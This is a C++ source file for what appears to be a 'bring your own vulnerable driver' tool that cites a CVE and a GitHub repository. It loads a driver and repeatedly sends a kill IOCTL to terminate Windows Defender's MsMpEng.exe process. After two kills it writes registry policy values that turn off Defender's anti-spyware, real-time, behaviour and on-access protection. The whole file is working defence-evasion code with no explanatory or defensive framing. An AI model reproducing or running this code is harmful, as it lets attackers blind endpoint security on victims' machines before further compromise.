#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include "LoadDriver.h"


#define IOCTL_KILL_PROCESS 0xB822200C

// https://github.com/DeathShotXD/0xKern3lCrush-Foreverday-BYOVD-CVE-2026-0828

int getPIDbyProcName(const std::string& procName) {
	int pid = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) {
		return 0;
	}
	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);
	if (Process32FirstW(hSnap, &pe32) != FALSE) {
		std::wstring wideProcName(procName.begin(), procName.end());
		do {
			if (_wcsicmp(pe32.szExeFile, wideProcName.c_str()) == 0) {
				pid = pe32.th32ProcessID;
				break;
			}
		} while (Process32NextW(hSnap, &pe32) != FALSE);
	}

	CloseHandle(hSnap);
	return pid;
}

int main() {
	int loadDriverResult = LoadDriver();

	HANDLE hDevice = INVALID_HANDLE_VALUE;

	hDevice = CreateFileA("\\\\.\\STProcessMonitorDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("Failed to open device: %d\n", GetLastError());
		return 1;
	}
	else {
		printf("Device opened successfully.\n");
	}

	int terminatedCount = 0;
	bool amnesiaHaze = false;
	while (true) {
		UINT64 windefPID = getPIDbyProcName("MsMpEng.exe"); // Replace with the current process name you want to terminate
		if (windefPID == 0) {
			printf("Windows Defender process not found\n");
			Sleep(2000);
			continue;
		}

		DWORD bytesReturned;
		BOOL result = DeviceIoControl(hDevice, IOCTL_KILL_PROCESS, &windefPID, sizeof(windefPID), NULL, 0, &bytesReturned, NULL);
		if (result) {
			printf("Process with PID %d has been terminated successfully.\n", windefPID);

			// Permanent Disable Windows Defener
			/*if (terminatedCount >= 2) {
				Sleep(50);
				HKEY key;
				HKEY new_key;
				DWORD disable = 1;
				LONG res = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key);
				if (res == ERROR_SUCCESS) {	
					RegSetValueExA(key, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
					RegCreateKeyExA(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);
					RegSetValueExA(new_key, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
					RegSetValueExA(new_key, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
					RegSetValueExA(new_key, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
					RegSetValueExA(new_key, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
					RegSetValueExA(new_key, "DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));

					RegCloseKey(key);
					RegCloseKey(new_key);
				}
			}*/
			if (terminatedCount >= 2 && !amnesiaHaze) {
				Sleep(50);

				HKEY key = NULL;
				HKEY new_key = NULL;
				DWORD disable = 1;
				LONG res;

				printf("[*] Attempting to disable Windows Defender via registry...\n");

				// Open the main Defender policy key
				res = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
					"SOFTWARE\\Policies\\Microsoft\\Windows Defender",
					0, KEY_ALL_ACCESS, &key);

				if (res != ERROR_SUCCESS) {
					printf("[!] Failed to open Windows Defender policy key. Error: %ld\n", res);
					if (res == ERROR_ACCESS_DENIED) {
						printf("[!] Access denied. Run as Administrator.\n");
					}
					return -1; // or handle accordingly
				}

				printf("[+] Successfully opened Defender policy key.\n");

				// Set DisableAntiSpyware
				res = RegSetValueExA(key, "DisableAntiSpyware", 0, REG_DWORD,
					(const BYTE*)&disable, sizeof(disable));

				if (res == ERROR_SUCCESS) {
					printf("[+] DisableAntiSpyware set to 1.\n");
				}
				else {
					printf("[!] Failed to set DisableAntiSpyware. Error: %ld\n", res);
				}

				// Create and configure Real-Time Protection subkey
				DWORD disposition;
				res = RegCreateKeyExA(key, "Real-Time Protection", 0, NULL,
					REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS,
					NULL, &new_key, &disposition);

				if (res != ERROR_SUCCESS) {
					printf("[!] Failed to create/open Real-Time Protection key. Error: %ld\n", res);
					RegCloseKey(key);
					return -1;
				}

				printf("[+] %s Real-Time Protection key.\n",
					(disposition == REG_CREATED_NEW_KEY) ? "Created" : "Opened");

				// Set all Real-Time Protection disable values
				const char* rtValues[] = {
					"DisableRealtimeMonitoring",
					"DisableBehaviorMonitoring",
					"DisableScanOnRealtimeEnable",
					"DisableOnAccessProtection",
					"DisableIOAVProtection"
				};

				for (int i = 0; i < 5; i++) {
					res = RegSetValueExA(new_key, rtValues[i], 0, REG_DWORD,
						(const BYTE*)&disable, sizeof(disable));

					if (res == ERROR_SUCCESS) {
						printf("[+] %s set to 1.\n", rtValues[i]);
					}
					else {
						printf("[!] Failed to set %s. Error: %ld\n", rtValues[i], res);
					}
				}

				if (key) RegCloseKey(key);
				if (new_key) RegCloseKey(new_key);
				printf("[+] Windows Defender disable operation completed, restart the computer to apply the changes.\n");
				amnesiaHaze = true;
			}
			terminatedCount++;
		}
		else {
			printf("Failed to terminate process with PID %d: %d\n", windefPID, GetLastError());
		}
		Sleep(2000);
	}
}